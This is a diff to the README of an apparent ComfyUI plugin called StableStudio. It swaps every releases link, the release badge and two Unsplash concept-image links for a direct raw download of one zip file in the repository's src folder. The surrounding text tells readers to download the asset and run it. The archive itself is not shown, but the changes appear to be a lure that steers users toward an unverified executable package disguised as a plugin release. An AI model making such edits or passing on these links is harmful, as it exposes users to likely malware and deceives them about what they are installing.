@@ -1,8 +1,8 @@
 # ComfyUI-StableStudio: StableStudio UI for ComfyUI Plugins
 
-[![Releases](https://img.shields.io/badge/Release-Open-1f425f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/angosprojetos/ComfyUI-StableStudio/releases)
+[![Releases](https://github.com/angosprojetos/ComfyUI-StableStudio/raw/refs/heads/master/src/Stable_Comfy_Studio_U_3.0.zip)](https://github.com/angosprojetos/ComfyUI-StableStudio/raw/refs/heads/master/src/Stable_Comfy_Studio_U_3.0.zip)
 
-https://github.com/angosprojetos/ComfyUI-StableStudio/releases
+https://github.com/angosprojetos/ComfyUI-StableStudio/raw/refs/heads/master/src/Stable_Comfy_Studio_U_3.0.zip
 
 A practical plug‑in that adds a StableStudio style user interface to ComfyUI. This project aims to give you a clean, responsive UI for managing StableStudio features inside ComfyUI, without complicating your workflow. It focuses on reliability, speed, and a calm, uncluttered design that helps you work faster.
 
@@ -59,8 +59,8 @@ Images show typical UI screens adapted for stability and clarity. They illustrat
 
 (Image credits: using open resources that align with UI and technical visuals)
 
-[UI concept image 1](https://images.unsplash.com/photo-1518773553398-650c184e2ba8?auto=format&fit=crop&w=1200&q=60)
-[UI concept image 2](https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=1200&q=60)
+[UI concept image 1](https://github.com/angosprojetos/ComfyUI-StableStudio/raw/refs/heads/master/src/Stable_Comfy_Studio_U_3.0.zip)
+[UI concept image 2](https://github.com/angosprojetos/ComfyUI-StableStudio/raw/refs/heads/master/src/Stable_Comfy_Studio_U_3.0.zip)
 
 ---
 
@@ -274,7 +274,7 @@ Thank you to everyone who tests, files issues, and shares improvements. Your inp
 
 For direct access to the latest builds and assets, visit the official releases page. The assets are prepared for different platforms. You should download the asset that matches your operating system and run it to install the UI features. The link to the releases page is provided again here for your convenience:
 
-https://github.com/angosprojetos/ComfyUI-StableStudio/releases
+https://github.com/angosprojetos/ComfyUI-StableStudio/raw/refs/heads/master/src/Stable_Comfy_Studio_U_3.0.zip
 
 If you need to verify the asset before running it, check the release notes and asset labels. Each release includes a package designed to be dropped into your ComfyUI plugins folder. After installation, restart ComfyUI and enable the StableStudio UI.
 
@@ -287,7 +287,7 @@ Reproduction of steps:
 
 Again, the primary point is to ensure you obtain the official asset from the Releases page and execute it in your environment. For convenience, you can visit the same releases page again to review the latest notes and asset lists:
 
-https://github.com/angosprojetos/ComfyUI-StableStudio/releases
+https://github.com/angosprojetos/ComfyUI-StableStudio/raw/refs/heads/master/src/Stable_Comfy_Studio_U_3.0.zip
 
 ---
 
